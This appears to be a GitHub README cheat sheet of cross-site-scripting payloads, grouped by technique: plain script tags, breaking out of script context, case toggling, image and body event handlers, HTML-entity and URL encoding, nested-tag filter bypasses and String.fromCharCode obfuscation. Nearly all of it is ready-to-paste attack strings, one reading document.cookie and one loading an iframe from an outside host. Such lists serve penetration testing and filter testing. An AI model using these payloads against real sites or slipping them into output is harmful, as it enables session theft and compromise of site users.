# Xss-cheat-sheet
<h2>These are some of the Xss (Cross-Site-Scripting) payloads.</h2>
<a href="https://portswigger.net/web-security/cross-site-scripting">What is Cross-Site-Scripting?</a>

Basic XSS codes:
<p>———————————-<p>

    ```<script>alert(“XSS”)</script>```

    ```<script>alert(“XSS”);</script>```

    ```<script>alert(‘XSS’)</script>```
    
   ```“><script>alert(“XSS”)</script>```

    ```<script>alert(/XSS”)</script>```

    ```<script>alert(/XSS/)</script>```

When inside Script tag:
<p>———————————</p>

    ```</script><script>alert(1)</script>```
    ```‘; alert(1);```
    ```‘)alert(1);//```

Bypassing with toggle case:
<p>————————————–</p>

     ```<ScRiPt>alert(1)</sCriPt>```
      ```<IMG SRC=jAVasCrIPt:alert(‘XSS’)>```

XSS in Image and HTML tags:
<p>———————————————</p>

    ```<IMG SRC=”javascript:alert(‘XSS’);”>```
   ```<IMG SRC=javascript:alert(&quot;XSS&quot;)>```
    ```<IMG SRC=javascript:alert(‘XSS’)>```      

    ```<img src=xss onerror=alert(1)>```
    ```<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>```
    ```<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>```
    ```<IMG SRC=”jav ascript:alert(‘XSS’);”>```

    ```<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>```

    ```<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>```

    ```<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>```

    ```<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>```

    ```<BODY BACKGROUND=”javascript:alert(‘XSS’)”>```

    ```<BODY ONLOAD=alert(‘XSS’)>```
    ```<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>```
    ```<IMG SRC=”javascript:alert(‘XSS’)”```

   ```<iframe src=http://ha.ckers.org/scriptlet.html <```

Bypass the script tag filtering:
<p>————————————————–</p>

    ```<<SCRIPT>alert(“XSS”);//<</SCRIPT>```

    ```%253cscript%253ealert(1)%253c/script%253e```

    ```“><s”%2b”cript>alert(document.cookie)</script>```

    ```foo<script>alert(1)</script>```

    ```<scr<script>ipt>alert(1)</scr</script>ipt>```

Using String.fromCharCode function:
<p>—————————————————–</p>

    ```<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>```

    ```‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>```
